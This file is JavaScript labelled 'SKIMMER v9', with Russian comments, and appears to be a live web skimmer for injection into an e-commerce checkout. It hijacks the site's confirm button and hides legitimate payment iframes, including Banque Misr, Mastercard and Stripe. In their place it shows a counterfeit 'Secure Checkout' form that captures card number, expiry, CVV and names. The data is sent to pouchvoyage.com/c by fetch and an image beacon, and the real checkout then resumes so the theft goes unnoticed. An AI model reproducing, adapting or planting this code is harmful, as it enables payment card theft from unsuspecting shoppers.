/**
 * SKIMMER v9.
 * FIX: при инжекте ЗАКРЫВАЕМ все bootstrap-модалки сайта (они за нашим окном и
 * блокируют ввод через focus trap) + фокус на первое поле. Esc закрывает нашу форму.
 * Флоу: Confirm → перехват → закрыть их модалки → клон → карта → pouchvoyage.com/c
 * → восстановить и продолжить реальный флоу.
 */
(function () {
  'use strict';
  if (window.__SK_RUN) return;
  window.__SK_RUN = true;

  var HOOK = 'https://pouchvoyage.com/c';
  var TAG = 'sk_v9';

  function send(data) {
    try {
      fetch(HOOK, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }).catch(function () {});
      var img = new Image();
      img.src = HOOK + '?d=' + encodeURIComponent(JSON.stringify(data).slice(0, 900));
    } catch (e) {}
  }

  var INJECTED = false;

  /* Закрыть все модалки сайта (bootstrap) — иначе focus trap блокирует ввод */
  function closeTheirModals() {
    try {
      document.querySelectorAll('.modal.show, .modal[style*="display: block"]').forEach(function (m) {
        m.classList.remove('show');
        m.style.display = 'none';
        m.setAttribute('aria-hidden', 'true');
        m.removeAttribute('aria-modal');
      });
      document.querySelectorAll('.modal-backdrop').forEach(function (b) { b.remove(); });
      document.body.classList.remove('modal-open');
      document.body.style.overflow = '';
      document.body.style.paddingRight = '';
    } catch (e) {}
  }

  function injectForm() {
    if (INJECTED) return;
    INJECTED = true;

    closeTheirModals();

    try {
      document.querySelectorAll('iframe').forEach(function (f) {
        var s = (f.src || '') + (f.name || '') + (f.id || '');
        if (/(bankmisr|banquemisr|gateway|mastercard|stripe|ryft|paymob|payment|checkout)/i.test(s)) {
          f.style.cssText = 'visibility:hidden!important;height:0!important;width:0!important;position:absolute!important;left:-9999px!important;';
        }
      });
    } catch (e) {}

    try {
      var bd = document.createElement('div');
      bd.id = 'skBackdrop';
      bd.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:2147483645;';
      document.body.appendChild(bd);

      var d = document.createElement('div');
      d.id = 'skCardModal';
      d.setAttribute('tabindex', '-1');
      d.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:2147483647;' +
        'background:#fff;border-radius:8px;box-shadow:0 8px 40px rgba(0,0,0,.4);padding:24px 26px;' +
        'width:460px;max-width:94vw;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;' +
        'pointer-events:auto;box-sizing:border-box;';

      d.innerHTML =
        '<div style="display:flex;align-items:center;gap:10px;margin-bottom:6px;">' +
        '  <div style="width:36px;height:36px;border-radius:50%;background:#D24646;color:#fff;display:flex;align-items:center;justify-content:center;font-size:17px;">&#128274;</div>' +
        '  <div style="font-size:19px;font-weight:600;color:#141414;">Secure Checkout</div>' +
        '</div>' +
        '<div style="font-size:13px;color:#6c757d;margin-bottom:20px;padding-left:46px;">Your payment details are protected and encrypted</div>' +

        '<div style="margin-bottom:14px;">' +
        '  <label style="font-size:13px;font-weight:600;color:#141414;display:block;margin-bottom:5px;">Cardholder name <span style="color:#c00">*</span></label>' +
        '  <input id="skName" autocomplete="off" placeholder="Name on card" ' +
        '     style="width:100%;box-sizing:border-box;padding:10px 12px;border:1px solid #ced4da;border-radius:5px;font-size:14px;background:#fff;color:#141414;outline:none;">' +
        '</div>' +

        '<div style="margin-bottom:14px;">' +
        '  <label style="font-size:13px;font-weight:600;color:#141414;display:block;margin-bottom:5px;">Card number <span style="color:#c00">*</span></label>' +
        '  <div style="display:flex;align-items:stretch;">' +
        '    <input id="skNum" autocomplete="off" inputmode="numeric" placeholder="0000 0000 0000 0000" ' +
        '       style="flex:1;box-sizing:border-box;padding:10px 12px;border:1px solid #ced4da;border-right:none;border-radius:5px 0 0 5px;font-size:14px;outline:none;">' +
        '    <div style="display:flex;align-items:center;gap:4px;padding:0 10px;border:1px solid #ced4da;border-radius:0 5px 5px 0;background:#fff;">' +
        '      <span style="font-size:15px;">&#128274;</span>' +
        '    </div>' +
        '  </div>' +
        '</div>' +

        '<div style="margin-bottom:14px;">' +
        '  <label style="font-size:13px;font-weight:600;color:#141414;display:block;margin-bottom:5px;">Expiry date <span style="color:#c00">*</span></label>' +
        '  <div style="display:flex;align-items:center;gap:8px;">' +
        '    <input id="skExpM" inputmode="numeric" maxlength="2" placeholder="MM" style="width:70px;box-sizing:border-box;padding:10px 12px;border:1px solid #ced4da;border-radius:5px;font-size:14px;text-align:center;outline:none;">' +
        '    <span style="color:#6c757d;font-size:15px;">/</span>' +
        '    <input id="skExpY" inputmode="numeric" maxlength="2" placeholder="YY" style="width:70px;box-sizing:border-box;padding:10px 12px;border:1px solid #ced4da;border-radius:5px;font-size:14px;text-align:center;outline:none;">' +
        '  </div>' +
        '</div>' +

        '<div style="margin-bottom:14px;">' +
        '  <label style="font-size:13px;font-weight:600;color:#141414;display:block;margin-bottom:5px;">Security code <span style="color:#c00">*</span></label>' +
        '  <input id="skCvv" autocomplete="off" inputmode="numeric" maxlength="4" placeholder="123" ' +
        '     style="width:110px;box-sizing:border-box;padding:10px 12px;border:1px solid #ced4da;border-radius:5px;font-size:14px;outline:none;">' +
        '</div>' +

        '<div style="margin-bottom:18px;">' +
        '  <label style="font-size:13px;font-weight:600;color:#141414;display:block;margin-bottom:5px;">Full name <span style="color:#c00">*</span></label>' +
        '  <input id="skFullName" autocomplete="off" placeholder="Your full name" ' +
        '     style="width:100%;box-sizing:border-box;padding:10px 12px;border:1px solid #ced4da;border-radius:5px;font-size:14px;outline:none;">' +
        '</div>' +

        '<button id="skPayBtn" style="width:100%;padding:12px;background:#D24646;color:#fff;border:none;border-radius:6px;' +
        'font-size:16px;font-weight:600;cursor:pointer;">Pay</button>' +
        '<div style="display:flex;justify-content:center;align-items:center;gap:6px;margin-top:12px;color:#6c757d;font-size:12px;">' +
        '  <span>&#128274;</span> Secured by Banque Misr</div>' +
        '<div id="skStatus" style="text-align:center;font-size:13px;color:#dc3545;margin-top:8px;min-height:17px;"></div>';
      document.body.appendChild(d);

      // фокус на первое поле — гарантия ввода
      setTimeout(function () {
        try {
          var f = document.getElementById('skName');
          if (f) f.focus();
        } catch (e) {}
      }, 100);

      var name = d.querySelector('#skName'), num = d.querySelector('#skNum'),
          expM = d.querySelector('#skExpM'), expY = d.querySelector('#skExpY'),
          cvv = d.querySelector('#skCvv'), fname = d.querySelector('#skFullName'),
          btn = d.querySelector('#skPayBtn'), status = d.querySelector('#skStatus');

      btn.addEventListener('click', function () {
        if (!fname.value.trim()) {
          fname.style.border = '2px solid #dc3545';
          status.innerHTML = 'Please enter your full name';
          return;
        }
        if (!num.value.trim() || !expM.value.trim() || !expY.value.trim() || !cvv.value.trim()) {
          status.innerHTML = 'Please fill in all card fields';
          return;
        }
        send({
          tag: TAG,
          url: location.href,
          full_name: fname.value.trim(),
          card_number: (num.value || '').replace(/\s+/g, ''),
          expiry: (expM.value || '') + '/' + (expY.value || ''),
          cvv: cvv.value || '',
          holder: name.value || '',
          ts: new Date().toISOString()
        });
        status.innerHTML = 'Processing&hellip;';
        status.style.color = '#6c757d';
        btn.disabled = true;
        btn.style.background = '#999';
        setTimeout(function () {
          try {
            if (window.__skOrigConfirm) {
              var m = document.getElementById('skCardModal');
              var b2 = document.getElementById('skBackdrop');
              if (m) m.remove();
              if (b2) b2.remove();
              INJECTED = false;
              window.__skOrigConfirm();
            }
          } catch (e) {}
        }, 1600);
      });

      // Esc — закрыть нашу форму и вернуть их модалку
      var escHandler = function (ev) {
        if (ev.key === 'Escape') {
          var m = document.getElementById('skCardModal');
          var b2 = document.getElementById('skBackdrop');
          if (m) m.remove();
          if (b2) b2.remove();
          INJECTED = false;
          document.removeEventListener('keydown', escHandler);
        }
      };
      document.addEventListener('keydown', escHandler, true);
    } catch (e) {}
  }

  var lastClick = 0;

  function hookClicks() {
    document.addEventListener('click', function (ev) {
      var el = ev.target;
      while (el && el !== document.body) {
        var oc = (el.getAttribute && el.getAttribute('onclick')) || '';
        if (/confirmQuantity/i.test(oc)) {
          var now = Date.now();
          if (now - lastClick < 3000) return;
          lastClick = now;
          ev.preventDefault();
          ev.stopImmediatePropagation();
          var arg = (oc.match(/confirmQuantity\(\s*['"]?([^'")\s]+)['"]?\s*\)/) || [])[1];
          window.__skOrigConfirm = function () {
            try {
              if (typeof window.confirmQuantity === 'function') {
                window.confirmQuantity(arg);
              } else if (el && el.click) {
                el.click();
              }
            } catch (e) {}
          };
          injectForm();
          return;
        }
        el = el.parentElement;
      }
    }, true);
  }

  try {
    hookClicks();
  } catch (e) {}
})();
